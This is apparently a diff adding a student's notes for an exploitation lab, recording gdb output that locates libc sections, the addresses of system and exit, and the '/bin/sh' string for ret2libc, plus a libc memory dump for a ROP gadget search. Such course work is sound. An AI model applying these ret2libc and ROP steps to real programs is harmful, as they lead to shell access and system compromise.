@@ -1,0 +1,20 @@
+q1b self documentation - ret2libc with system:
+----------------------
+(gdb) info files
+0xb7b270f0 - 0xb7c7aa96 is .text in /lib/i386-linux-gnu/libc.so.6
+0xb7c7c000 - 0xb7c9fb98 is .rodata in /lib/i386-linux-gnu/libc.so.6
+
+(gdb) print system
+$2 = {int (const char *)} 0xb7b4f040 <__libc_system>
+
+(gdb) find 0xb7c7c000, 0xb7c9fb98, "/bin/sh"
+0xb7c96338
+
+q1c self documentation - ret2libc with system and exit:
+----------------------
+(gdb) print exit
+$1 = {void (int)} 0xb7b41990 <__GI_exit>
+
+q2 self documentation - building a ROP gadget search engine:
+---------------------
+(gdb) dump binary memory libc.bin 0xb7b270f0 0xb7c7aa96
